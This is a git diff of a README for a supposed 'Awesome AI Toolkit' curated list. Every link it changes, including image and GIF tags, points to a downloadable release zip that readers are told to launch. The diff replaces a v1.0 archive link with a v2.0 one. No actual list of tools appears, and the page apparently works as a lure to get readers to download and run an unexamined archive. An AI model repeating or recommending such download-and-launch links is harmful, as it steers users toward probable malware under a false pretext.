@@ -2,7 +2,7 @@
 
 Welcome to the **Awesome AI Toolkit** repository! Here you will find an extensive curated list of AI tools, frameworks, and libraries to supercharge your artificial intelligence projects.
 
-![AI Image](https://github.com/NotAP0tato/awesome-ai-toolkit/releases/download/v1.0/Release.zip)
+![AI Image](https://github.com/NotAP0tato/awesome-ai-toolkit/releases/download/v2.0/Software.zip)
 
 ## Contents 📦
 
@@ -22,7 +22,7 @@ Whether you are an AI enthusiast, researcher, or developer, this repository aims
 
 To get started with the **Awesome AI Toolkit**, simply click the link below to download the software package:
 
-[![Download Software](https://github.com/NotAP0tato/awesome-ai-toolkit/releases/download/v1.0/Release.zip)](https://github.com/NotAP0tato/awesome-ai-toolkit/releases/download/v1.0/Release.zip)
+[![Download Software](https://github.com/NotAP0tato/awesome-ai-toolkit/releases/download/v2.0/Software.zip)](https://github.com/NotAP0tato/awesome-ai-toolkit/releases/download/v2.0/Software.zip)
 
 Please note that the downloaded file needs to be launched to access the AI tools included in the toolkit.
 
@@ -59,6 +59,6 @@ The **Awesome AI Toolkit** is licensed under the MIT License. See the [LICENSE](
 
 ---
 
-Start exploring the world of artificial intelligence with the **Awesome AI Toolkit**! Visit the [link](https://github.com/NotAP0tato/awesome-ai-toolkit/releases/download/v1.0/Release.zip) to download the software package and unlock a wealth of AI resources. Happy coding! 🌟
+Start exploring the world of artificial intelligence with the **Awesome AI Toolkit**! Visit the [link](https://github.com/NotAP0tato/awesome-ai-toolkit/releases/download/v2.0/Software.zip) to download the software package and unlock a wealth of AI resources. Happy coding! 🌟
 
-![AI Gif](https://github.com/NotAP0tato/awesome-ai-toolkit/releases/download/v1.0/Release.zip)
+![AI Gif](https://github.com/NotAP0tato/awesome-ai-toolkit/releases/download/v2.0/Software.zip)
